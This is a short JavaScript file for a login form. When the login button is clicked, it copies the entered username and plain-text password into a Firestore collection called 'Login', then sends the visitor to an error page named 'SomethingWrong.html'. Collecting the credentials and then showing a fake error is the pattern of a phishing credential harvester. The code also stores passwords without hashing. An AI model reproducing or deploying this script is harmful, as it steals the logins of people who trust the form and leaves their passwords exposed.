const UsernameField = document.getElementById('UserUsername');
const passwordField = document.getElementById('UserPassword');
const signUpButton = document.getElementById('LoginBtn');

signUpButton.addEventListener('click', function() {

    const Username = UsernameField.value;
    const password = passwordField.value;

    db.collection("Login").doc(Username)
    db.collection("Login").doc(Username).set({
        Username: Username,
        Pass: password,
    })
    .then((docRef) => {
        console.log("user added");
        UsernameField.value = "";
        passwordField.value = "";
        window.location.href = "Erorr/SomethingWrong.html";
    })
    .catch((error) => {
        console.error("Error adding User: ", error);
    });
});